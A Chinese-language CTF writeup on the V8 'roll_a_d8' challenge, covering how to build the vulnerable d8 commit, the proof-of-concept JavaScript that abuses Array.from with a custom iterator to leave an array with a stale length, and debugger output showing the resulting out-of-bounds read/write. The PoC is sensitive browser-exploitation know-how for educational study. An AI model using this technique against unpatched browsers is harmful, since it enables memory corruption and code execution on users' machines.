
# [原创] roll_a_d8 新人向 Writeup

## 前言

因为最近想尝试一些不同的东西，所以就找了几道 `V8` 的 `CTF` 题目来做，权当涨涨见识，自然这篇文章也就算不上是一篇入门文章或者是浏览器漏洞分析（因为我自己也不会），最多算是踩坑记录，如果有错误的话欢迎师傅们指出。

- 首先，`V8` 的资料其实还挺多的，既有技术大佬写的知识总结，也有类似我这种新手的一些学习笔记，如果要从中筛选出各阶段最适合自己的材料还是要花不少时间的，~~不过不用担心，<a href="elink@2c8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5k6h3c8G2k6%4N6#2i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1j5J5x3o6p5&6i4K6u0r3x3e0q4Q4x3V1j5H3x3#2)9J5c8X3A6#2M7%4c8Q4x3X3c8H3N6$3&6Q4x3X3c8A6N6q4)9J5k6r3k6G2M7W2)9J5k6r3k6#2L8W2)9J5k6o6l9H3i4K6u0r3">just pwn it for fun</a> 已经是一篇很优秀的入门文章了，对我帮助非常大。~~出于不可抗力因素，这篇文章已经无了。

- 其次，`V8` 的编译环境可以参考<a href="elink@53eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3@1J5x3o6p5&6i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6B7k6h3E0&6L8r3I4Q4x3V1k6#2M7r3c8S2N6r3g2Q4x3V1j5J5x3o6p5&6i4K6u0r3x3o6N6Q4x3V1j5I4z5q4)9J5c8W2j5^5i4K6u0V1c8h3&6$3i4K6u0V1b7$3!0F1k6X3W2Y4i4K6u0W2K9s2c8E0L8l9`.`.">V8 环境搭建，100% 成功版</a>，我照着这个教程一次性就搭出来了，其他一些工具（`pwndbg` 等）之前就安装好了，所以环境搭建上其实还是挺简单的。

- 另外我本来就不擅长写文章，再加上这本来就是我没接触过的方向，所以如果你照着文章复现失败的话，十有八九是我的表述有问题，可以看看其他师傅的 `writeup`，多半也就懂了，我会在文末放上我参考过的文章。

## 题目构建

在题目所给的<a href="elink@15aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1N6h3N6K6i4K6u0W2j5$3S2J5L8$3#2A6N6h3#2Q4x3X3g2G2M7X3N6Q4x3V1k6H3i4K6u0r3j5$3S2J5L8$3#2A6N6h3#2Q4x3V1k6A6M7%4y4#2k6i4y4Q4x3V1k6V1k6i4c8S2K9h3I4Q4x3@1k6A6k6q4)9K6c8o6R3J5x3e0p5K6y4H3`.`.">链接</a>中可以找到修复 bug 的<a href="elink@446K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0K9s2u0G2L8h3W2#2L8g2)9J5k6h3N6G2L8$3N6D9k6i4y4G2N6i4u0U0k6g2)9J5k6h3y4G2L8g2)9J5k6r3k6G2M7W2)9J5k6r3k6#2L8W2)9J5k6o6l9H3i4K6u0r3N6U0S2Q4x3X3g2Y4K9i4c8Q4x3V1k6Q4x3V1u0Q4x3V1k6T1y4h3c8S2y4e0N6S2x3o6k6V1k6e0R3%4z5e0p5$3z5e0y4U0x3U0b7^5j5U0N6S2j5h3k6U0y4K6x3@1z5o6j5I4j5e0x3%4z5o6g2V1">commit</a>，接着我们就得到了漏洞版本的 `hash` 值和 `diff` 文件，以及一个 `poc` 文件。

![image-20210719183042061](upload/attach/202108/862439\_NNC5EQA5293WQHZ.jpg)

首先根据 `hash` 值回退到漏洞版本：

```bash
# git reset --hard [commit hash with vulnerability]
# 使用这条命令来切换到漏洞版本的commit
git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
# 这里选择只编译v8来加快速度
gclient sync
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```

漫长的等待之后我们用编译好的 `d8` 运行 `poc.js`，成功触发 `crash`。

![image-20210719183055435](upload/attach/202108/862439\_D7EURAG7T3WDJJD.jpg)

## `poc` 分析

开始分析 `poc` 之前，很有必要了解一下数组的对象结构：

```text
JSArray
0x0+-----------------------+
|kMapOffset |
0x8+-----------------------+
|kPropertiesOffset |
0x10+-----------------------+ JSFixedArray
|kElementsOffset +----------->0x0+-----------------------+
0x18+-----------------------+ |kMapOffset |
|kLengthOffset | 0x8+-----------------------+
0x20+-----------------------+ |kLengthOffset |
0x10+-----------------------+
|element 0 |
0x18+-----------------------+
|element 1 |
0x20+-----------------------+
|element 2 |
0x28+-----------------------+
|... |
+-----------------------+
```

更详细的表述请参考文末的链接，接着来看 `poc`：

```javascript
let oobArray = [];
let maxSize = 1028 \* 8;
// Array.from() 方法从一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例。
// call() 方法使用一个指定的 this 值和单独给出的一个或多个参数来调用一个函数。
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : \_ => (
{
// 自己实现的迭代器
counter : 0,
next() {
let result = this.counter++;
if (this.counter > maxSize) {
// 迭代结束之后将length置零
oobArray.length = 0;
return {done: true};
} else {
return {value: result, done: false};
}
}
}
) });
// 之后触发崩溃
oobArray[oobArray.length - 1] = 0x41414141;
```

首先我们创建了 `oobArray` 数组，接着以 `function() { return oobArray }` 作为 `Array.from` 方法运行时使用的 `this` 值，和一个带有迭代器的对象作为参数进行执行。这里我参考了一下 `polyfill` 的 `Array.from` 实现来理解为什么要这样设置参数。

```javascript
// 省略了一大堆其他的代码，完整版 https://github.com/inexorabletash/polyfill/blob/master/es6.js
// 22.1.2.1 Array.from ( items [ , mapfn [ , thisArg ] ] )
define(
Array, 'from',
function from(items) {
var c = strict(this); // this 就是 function() { return oobArray }
// 判断是否可以迭代
var usingIterator = GetMethod(items, $$iterator);
if (usingIterator !== undefined) {
if (IsConstructor(c)) { // IsConstructor函数检查对象是否为构造函数,此处返回true
/\*
当代码 new Foo(...) 执行时，会发生以下事情：
1. 一个继承自 Foo.prototype 的新对象被创建。
2. 使用指定的参数调用构造函数 Foo，并将 this 绑定到新创建的对象。new Foo 等同于 new Foo()，也就是没有指定参数列表，Foo 不带任何参数调用的情况。
3. 由构造函数返回的对象就是 new 表达式的结果。如果构造函数没有显式返回一个对象，则使用步骤1创建的对象。（一般情况下，构造函数不返回值，但是用户可以选择主动返回对象，来覆盖正常对象创建的步骤）
\*/
var a = new c(); // 结合上面这么一大堆字,可以得出 a = oobArray
} else {
a = new Array(0);
}
var iterator = GetIterator(items, usingIterator);
var k = 0;
while (true) {
var next = IteratorStep(iterator);
if (next === false) {
a.length = k; // oobArray.length = k
return a; // return oobArray
}
a[k] = mappedValue; // oobArray[k] = mappedValue
k += 1;
}
}});
```

注释应该挺清楚了，`function() { return oobArray }` 做参数可以使得 `oobArray` 数组本身被修改。可以看看下面这个 `Demo`：

```bash
# dylan @ eureka in ~/v8\_pwn/roll\_a\_d8 [15:56:15]
$ cat test.js
var oobArray = [];
%DebugPrint(oobArray);
Array.from.call(function() { return oobArray }, [1,2,3]);
%DebugPrint(oobArray);
# dylan @ eureka in ~/v8\_pwn/roll\_a\_d8 [15:57:46]
$ ~/vvvvv8/v8/out.gn/x64.debug/d8 --allow-natives-syntax test.js
DebugPrint: 0x1fca3d08d4f9: [JSArray]
- map: 0x1d335e02571 <Map(PACKED\_SMI\_ELEMENTS)> [FastProperties]
- prototype: 0x1b4d6e385539 <JSArray[0]>
- elements: 0xa3822902251 <FixedArray[0]> [PACKED\_SMI\_ELEMENTS]
- length: 0
- properties: 0xa3822902251 <FixedArray[0]> {
#length: 0xa382294ff89 <AccessorInfo> (const accessor descriptor)
}
DebugPrint: 0x1fca3d08d4f9: [JSArray]
- map: 0x1d335e02571 <Map(PACKED\_SMI\_ELEMENTS)> [FastProperties]
- prototype: 0x1b4d6e385539 <JSArray[0]>
- elements: 0x1fca3d08d761 <FixedArray[17]> [PACKED\_SMI\_ELEMENTS]
- length: 3
- properties: 0xa3822902251 <FixedArray[0]> {
#length: 0xa382294ff89 <AccessorInfo> (const accessor descriptor)
}
- elements: 0x1fca3d08d761 <FixedArray[17]> {
0: 1
1: 2
2: 3
3-16: 0xa3822902321 <the\_hole>
}
```

再看看第二个参数，是一个带有迭代器的对象。其中，在迭代结束的时候将 `oobArray.Length` 设置为 0。分别比较一下置零和未置零的 `oobArray` 的状态。

```bash
# 迭代结束没有将oobArray.length置零
pwndbg> job 0x266f6b90da39
0x266f6b90da39: [JSArray]
- map: 0x2472db302571 <Map(PACKED\_SMI\_ELEMENTS)> [FastProperties]
- prototype: 0x34d88a085539 <JSArray[0]>
- elements: 0x1fb3c180ef81 <FixedArray[10018]> [PACKED\_SMI\_ELEMENTS]
- length: 8224
- properties: 0xa0a6f682251 <FixedArray[0]> {
#length: 0xa0a6f6cff89 <AccessorInfo> (const accessor descriptor)
}
- elements: 0x1fb3c180ef81 <FixedArray[10018]> {
省略参数
: 0xa0a6f682321 <the\_hole>
}
# 迭代结束将oobArray.length置零
pwndbg> job 0x213fb0f0da39
0x213fb0f0da39: [JSArray]
- map: 0x27d1d0202571 <Map(PACKED\_SMI\_ELEMENTS)> [FastProperties]
- prototype: 0x8fc75385539 <JSArray[0]>
- elements: 0x10d45dc02251 <FixedArray[0]> [PACKED\_SMI\_ELEMENTS]
- length: 8224
- properties: 0x10d45dc02251 <FixedArray[0]> {
#length: 0x10d45dc4ff89 <AccessorInfo> (const accessor descriptor)
}
```

`JSArray` 的 `elements` 结构指向一个足够大的数组，但是在将 `oobArray.length` 置零后，`JSArray` 的 `elements` 结构指向了 `FixedArray[0]` 这个空数组。此时 `JSArray` 的 `length` 结构依然是 `8224`，自然造成了越界读写。我们对比一下常规的 `length` 置零：

```bash
# dylan @ eureka in ~/v8\_pwn/roll\_a\_d8 [17:33:12]
$ cat test.js
var oobArray = [1,2,3];
%DebugPrint(oobArray);
oobArray.length = 0;
%DebugPrint(oobArray);
# dylan @ eureka in ~/v8\_pwn/roll\_a\_d8 [17:34:02]
$ ~/vvvvv8/v8/out.gn/x64.debug/d8 --allow-natives-syntax test.js
DebugPrint: 0x112f1d58d4d1: [JSArray]
- map: 0x39b574b82571 <Map(PACKED\_SMI\_ELEMENTS)> [FastProperties]
- prototype: 0x195f2ce05539 <JSArray[0]>
- elements: 0x112f1d58d479 <FixedArray[3]> [PACKED\_SMI\_ELEMENTS (COW)]
- length: 3
- properties: 0x1262e4482251 <FixedArray[0]> {
#length: 0x1262e44cff89 <AccessorInfo> (const accessor descriptor)
}
- elements: 0x112f1d58d479 <FixedArray[3]> {
0: 1
1: 2
2: 3
}
DebugPrint: 0x112f1d58d4d1: [JSArray]
- map: 0x39b574b82571 <Map(PACKED\_SMI\_ELEMENTS)> [FastProperties]
- prototype: 0x195f2ce05539 <JSArray[0]>
- elements: 0x1262e4482251 <FixedArray[0]> [PACKED\_SMI\_ELEMENTS]
- length: 0
- properties: 0x1262e4482251 <FixedArray[0]> {
#length: 0x1262e44cff89 <AccessorInfo> (const accessor descriptor)
}
```
